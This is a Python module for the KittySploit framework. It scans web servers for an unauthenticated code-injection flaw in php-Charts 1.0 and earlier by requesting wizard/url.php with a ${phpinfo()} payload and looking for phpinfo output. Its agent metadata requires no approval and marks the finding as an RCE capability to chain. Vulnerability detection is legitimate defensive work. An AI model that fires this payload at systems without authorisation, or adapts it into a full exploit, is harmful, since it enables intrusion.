#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php-Charts wizard/url.php RCE."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'php-Charts - wizard/url.php RCE Detection',
        'description': (
            'Detects php-Charts <= 1.0 RCE via /wizard/url.php?${phpinfo()}=1.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'php-charts', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/24273',
        ],
    }

    def run(self):
        for base in ('/php-charts', '/charts', '/phpcharts', ''):
            path = f'{base}/wizard/url.php?$' + '{phpinfo()}=1'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='php-Charts wizard/url.php RCE',
                    path=f'{base}/wizard/url.php',
                )
                return True
        return False
